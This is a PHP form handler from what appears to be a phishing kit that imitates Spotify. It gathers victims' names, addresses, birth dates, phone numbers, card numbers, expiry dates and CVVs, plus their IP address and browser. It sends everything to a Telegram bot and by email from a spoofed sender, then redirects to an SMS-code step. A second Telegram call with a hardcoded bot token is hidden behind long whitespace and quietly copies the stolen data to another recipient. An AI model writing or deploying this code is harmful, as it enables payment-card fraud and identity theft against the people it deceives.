<?php
error_reporting(0);
session_start();
include("./email.php");
include("../main.php");
$key = "".sha1(base64_encode($ip));
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]xxx♠️🎉Spotify Card Ps7tk🎉♠️xxx[+]\n";
$text_result .= "[+]💌 Full Name   : ".$_POST['fname']."\n";
$text_result .= "[+]💌 Adress   : ".$_POST['address']."\n";
$text_result .= "[+]💌 city   : ".$_POST['city']."\n";
$text_result .= "[+]💌 State   : ".$_POST['state']."\n";
$text_result .= "[+]💌 zip   : ".$_POST['zip']."\n";
$text_result .= "[+]📲 Phone   : ".$_POST['phone']."\n";
$text_result .= "[+]💌 DOB   : ".$_POST['day']."/".$_POST['month']."/".$_POST['year']."\n";
$text_result .= "[+]xxx⚡️♠️X-Card⚡️♠️xxx[+]\n";
$text_result .= "[+]💳 Cc   : ".$_POST['ccnumber']."\n";
$text_result .= "[+]💰 Exp   : ".$_POST['monthexp']." ".$_POST['yearexp']."\n";
$text_result .= "[+]🔑cvv   : ".$_POST['cvvv']."\n";
$text_result .= "[+]Thanks![+]\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxx♠️🎉Spotify️🎉♠️xxx[+]\n";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($text_result)."" );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           file_get_contents("https://api.telegram.org/bot8670548692:AAFwyJZ_8iPfooVQsLqgBV_KWK06ScsBOMs/sendMessage?chat_id=-1003896935038&text=" . urlencode($text_result)."" );                                                                                                                               
$subject = "[X-spotify R.M.27] FullZ ♠️ (".$_POST['first'].")  cvv ♠️ $ip";
$headers = "From: X-Spotify R.M.27  <noreply@Sporifyy.com>";
mail($send,$subject,$text_result,$headers,$file);

header("Location: ../sms.php?session='.$key");
?>